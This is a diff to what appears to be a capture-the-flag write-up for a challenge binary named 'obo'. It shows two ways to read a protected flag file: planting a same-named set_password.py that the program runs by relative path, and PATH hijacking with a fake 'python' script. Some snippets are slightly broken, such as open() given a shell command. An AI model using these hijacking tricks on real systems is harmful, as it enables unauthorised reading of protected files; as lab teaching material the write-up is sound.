@@ -77,17 +77,17 @@ There are a few ways we can exploit this.
 
 -------------1--------------
 
-We can go to the root directory and from there execute ```obo```. It is important to know that ```set_password.py``` is called relative to the program. Say we make a python file in the home directory with
+We can go up to the root directory, make a python file with identical name and from there execute ```obo```. It is important to know that ```set_password.py``` is called relative to the program. Say we make a python file in the root directory with
 identical name but has the following content
 
 ```
 print open("cat /home/obo/flag.txt").read()
 ```
-Then this would be the file executed by the program. So, in the root directory, enter the following in the command line
+then this would be the file executed by the program. So, in the root directory, enter the following in the command line
 ```
 python -c 'print "abcdefg123456789\n\x01" ' | /home/obo/obo
 ```
-Note that we have get to execute the program this way using Python because we want to pass integer (or hex) 1, not 1 as ASCII character. 
+Note that we have to execute the program this way using Python because we want to pass integer (or hex) 1, not 1 as ASCII character. 
 
 -------------2--------------
 
@@ -96,12 +96,12 @@ In the home directory, we can make a bash script named ```python``` with the fol
 #!bin/sh
 cat /home/obo/flag.txt
 ```
-Make this executable and modify the $PATH variable
+Make this executable and modify the $PATH variable as follows
 ```
 chmod +x python
 export PATH=/home_users/pico*****:$PATH
 ```
-We set the path as above because of the precedence - from left to right.
+We set the path as above because of the precedence - from left to right, in order to precede the actual python path.
 
 Also, in order to use the actual python command, we can call it as python2. So we just have to type in the command line
 ```
